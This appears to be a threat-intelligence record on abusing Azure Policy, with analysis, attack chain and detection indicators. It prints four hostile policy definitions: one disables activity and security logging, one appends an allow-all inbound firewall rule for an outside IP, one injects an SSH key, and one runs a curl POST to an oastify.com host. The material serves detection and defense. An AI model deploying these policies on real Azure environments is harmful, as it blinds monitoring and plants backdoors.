package_info.package_manager: Azure Policy (cloud service, not a traditional package manager)
package_info.package_versions: N/A (applies to custom and abused policy definitions/assignments)
package_info.why_malicious: Attackers can abuse Azure Policy's remediation and append effects to deploy, modify, or backdoor resources at scale, escalate privileges, and establish persistence, all under the guise of compliance or configuration management. These policies can be assigned or edited by users with the Resource Policy Contributor role or higher, enabling stealthy, automated, and privileged malicious actions across an Azure environment.

execution_context.trigger: During resource creation, update, or remediation runs
execution_context.file_location: Azure Policy definition (JSON/YAML), assigned at subscription/resource group/management group scope

malicious_snippets.code_snippet:
properties:
 type: Microsoft.Authorization/policyDefinitions
 displayName: Turn off activity logs
 policyRule:
   if:
     field: type
     equals: Microsoft.Resources/subscriptions
   then:
     effect: 'DeployIfNotExists'
     details:
       type: Microsoft.Insights/diagnosticSettings
       deploymentScope: Subscription
       existenceScope: Subscription
       existenceCondition:
         allof:
           - field: Microsoft.Insights/diagnosticSettings/logs.enabled
             equals: true
       deployment:
         properties:
           resources:
             - name: subscriptionToTurnOffActivityLogs
               type: Microsoft.Insights/diagnosticSettings
               location: Global
               properties:
                 workspaceId: 'MyWorkspaceID'
                 logs:
                   - category: Administrative
                     enabled: False
                   - category: Security
                     enabled: False
malicious_snippets.code_behavior: During resource creation, update, or remediation runs, the policy automatically deploys a diagnosticSettings resource with logging disabled for Administrative and Security categories at the subscription level, resulting in the suppression of activity and security logs and evasion of monitoring.

malice_analysis.why_suspicious: Disabling critical logging categories via automated policy is a direct anti-forensics and defense evasion tactic, especially when applied at scale and without oversight.
malice_analysis.violated_expectations: Standard policies are expected to enforce or enable logging for compliance and security; this policy disables essential logs, undermining auditability and monitoring.
malice_analysis.similar_legitimate_use: A legitimate use might reconfigure logging destinations or enable additional log categories, but never to disable all logging for security-relevant categories.
key_indicators: effect: DeployIfNotExists used to disable or remove security controls
logs.enabled explicitly set to false for Administrative and Security categories
Policy assignment at subscription scope, impacting all resources under the subscription

execution_context.trigger: During resource creation or update of network security groups (NSGs)
execution_context.file_location: Azure Policy definition (JSON/YAML), assigned at NSG scope

malicious_snippets.code_snippet:
properties:
 type: Microsoft.Authorization/policyDefinitions
 displayName: Append NSG Rule
 policyRule:
   if:
     allOf:
       - field: type
         equals: Microsoft.Network/networkSecurityGroups
       - field: name
         like: '*MyNSG'
   then:
     effect: Append
     details:
       - field: Microsoft.Network/networkSecurityGroups/securityRules[*]
         value:
           name: New NSG Rule
           properties:
             protocol: TCP
             sourcePortRange: '*'
             destinationPortRange: '*'
             sourceAddressPrefix: 172.217.17.17
             destinationAddressPrefix: '*'
             access: Allow
             priority: 1
             direction: Inbound
             sourcePortRanges: []
             destinationPortRanges: []
             sourceAddressPrefixes: []
             destinationAddressPrefixes: []
malicious_snippets.code_behavior: During resource creation or update of network security groups, the policy appends a new inbound NSG rule with priority 1 that allows all TCP traffic from the attacker-controlled IP 172.217.17.17 to any destination, enabling unauthorized network access to protected resources.

malice_analysis.why_suspicious: Appending permissive firewall rules from an attacker-controlled IP address is a direct method for establishing unauthorized access and bypassing network segmentation.
malice_analysis.violated_expectations: NSG policies should restrict access to trusted sources and follow least privilege; this policy opens access to a non-corporate IP with the highest priority, overriding existing protections.
malice_analysis.similar_legitimate_use: Legitimate automation may add access for trusted, documented IPs with proper change control and audit, but never for arbitrary or attacker-controlled addresses without oversight.
key_indicators: effect: Append used to add or override NSG rules
sourceAddressPrefix set to a non-corporate or suspicious IP (172.217.17.17)
priority set to 1, ensuring the rule takes precedence over all others

execution_context.trigger: During resource creation or update of virtual machines (VMs)
execution_context.file_location: Azure Policy definition (JSON/YAML), assigned at VM scope

malicious_snippets.code_snippet:
properties:
 type: Microsoft.Authorization/policyDefinitions
 displayName: zm-append-ssh
 policyType: Custom
 mode: Indexed
 policyRule:
   if:
     allOf:
       - field: type
         equals: Microsoft.Compute/virtualMachines
       - field: tags
         containsKey: zander-test
   then:
     effect: append
     details:
       - field: Microsoft.Compute/virtualMachines/osProfile.linuxConfiguration.ssh.publicKeys[*]
         value:
           keyData: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ==etc
           path: /home/zander.mackie/.ssh/authorized_keys
malicious_snippets.code_behavior: During VM creation or update, the policy appends an attacker-controlled SSH public key to the authorized_keys file of VMs tagged with 'zander-test', granting persistent remote shell access to the attacker.

malice_analysis.why_suspicious: Injecting unauthorized SSH keys into VM configurations is a classic persistence and backdoor technique, enabling covert access outside of normal authentication channels.
malice_analysis.violated_expectations: SSH keys should be managed by trusted provisioning systems and subject to audit; injecting keys via policy circumvents standard controls and is not auditable by default.
malice_analysis.similar_legitimate_use: Automated key management for DevOps is legitimate when tightly controlled and audited, but not for unapproved or unknown keys, especially those not matching corporate key fingerprints.
key_indicators: keyData does not match known or approved corporate keys
Policy targets VMs by specific tag (zander-test), indicating selective and stealthy backdooring

execution_context.trigger: During resource creation or update of Linux virtual machines
execution_context.file_location: Azure Policy definition (JSON/YAML), assigned at VM scope

malicious_snippets.code_snippet:
properties:
 type: Microsoft.Authorization/policyDefinitions
 displayName: Backdoor VMs
 policyRule:
   if:
     allOf:
       - field: type
         equals: Microsoft.Compute/virtualMachines
       - field: Microsoft.Compute/virtualMachines/storageProfile.osDisk.osType
         equals: Linux
   then:
     effect: DeployIfNotExists
     details:
       type: Microsoft.Compute/virtualMachines/extensions
       deployment:
         properties:
           template:
             resources:
               - name: 'extension'
                 type: Microsoft.Compute/virtualMachines/extensions
                 properties:
                   publisher: Microsoft.Azure.Extensions
                   type: CustomScript
                   settings:
                     commandToExecute: 'curl -X POST -H "Content-Type: application/json" -d ''{"data": "POC"}'' 1234.oastify.com'
malicious_snippets.code_behavior: During creation or update of Linux VMs, the policy deploys a CustomScript extension that executes a curl command to POST data to the external domain 1234.oastify.com, enabling remote command execution and data exfiltration to an attacker-controlled server.

malice_analysis.why_suspicious: Deploying arbitrary scripts/extensions that communicate with external, untrusted domains is a hallmark of backdooring and data exfiltration, especially when automated via policy.
malice_analysis.violated_expectations: CustomScript extensions should be tightly controlled and only used for legitimate configuration tasks; using them to establish C2 or exfiltrate data to untrusted domains is a clear abuse.
malice_analysis.similar_legitimate_use: Automated configuration management using CustomScript is legitimate when scripts are sourced from trusted repositories and do not communicate with unapproved external domains.
key_indicators: effect: DeployIfNotExists used to deploy CustomScript extension
commandToExecute includes outbound HTTP POST to external domain (1234.oastify.com)
Policy targets all Linux VMs, enabling broad backdoor deployment

attack_chain.action: Attacker creates or edits malicious policy definitions (e.g., disables logging, appends NSG rules, injects SSH keys, deploys backdoor extensions).
attack_chain.leads_to: Malicious policies are assigned to target scopes (subscriptions, resource groups, VMs, NSGs).

attack_chain.action: Malicious policies are assigned or existing assignments are modified, leveraging existing service principals and roles.
attack_chain.leads_to: Policies become active and begin affecting resources during creation/update or via remediation.

attack_chain.action: As resources are created or updated, policies automatically execute their effects: disabling logging, opening network access, injecting SSH keys, or deploying backdoor scripts.
attack_chain.leads_to: Attacker gains persistence, lateral movement, and evasion capabilities.

attack_chain.action: Attacker leverages new access (e.g., SSH, open network, C2 channel) to perform further malicious actions such as cryptomining, data exfiltration, or privilege escalation.
attack_chain.leads_to: Compromise of cloud environment, loss of visibility, and potential data breach.

behavioral_signatures: Policy definitions or assignments that disable or reduce logging (logs.enabled: false for Administrative or Security categories)
Policies that append or modify NSG rules to allow broad or suspicious IPs (e.g., 172.217.17.17)
Policies that inject SSH keys or modify osProfile.linuxConfiguration.ssh.publicKeys with unknown keyData
Policies that deploy CustomScript extensions with external network communication (e.g., HTTP POST to oastify.com)
Unusual or unauthorized use of DeployIfNotExists or Append effects in custom policies targeting security controls
file_indicators: Azure Policy definitions with effect: DeployIfNotExists or effect: append targeting logging, network, or authentication settings
Policy assignments or set definitions modified outside of normal change windows or by unapproved principals
Presence of CustomScript extensions on VMs not matching baseline or referencing untrusted domains
network_indicators: Outbound HTTP/HTTPS requests from VMs to untrusted or attacker-controlled domains (e.g., 1234.oastify.com, oastify.com)
New inbound connections from non-corporate or suspicious IPs (e.g., 172.217.17.17) allowed by NSG rules
Unexpected reduction or absence of diagnostic or activity log traffic from resources
detection_knowledge.how_to_detect: Continuously monitor for creation or modification of policy definitions and assignments, especially those using DeployIfNotExists or Append effects targeting logging, network, or authentication settings. Audit for policies that disable logging, open network access, or inject SSH keys with unknown keyData. Correlate policy changes with resource creation/update events. Alert on deployment of CustomScript extensions that communicate with external or untrusted domains. Review logs for Microsoft.Authorization/policyAssignments/write and Microsoft.Authorization/policySetDefinitions/write events, and investigate any changes to policy sets or assignments outside of approved change management. Cross-reference network logs for outbound connections to known attacker domains and inbound connections from suspicious IPs allowed by new NSG rules.
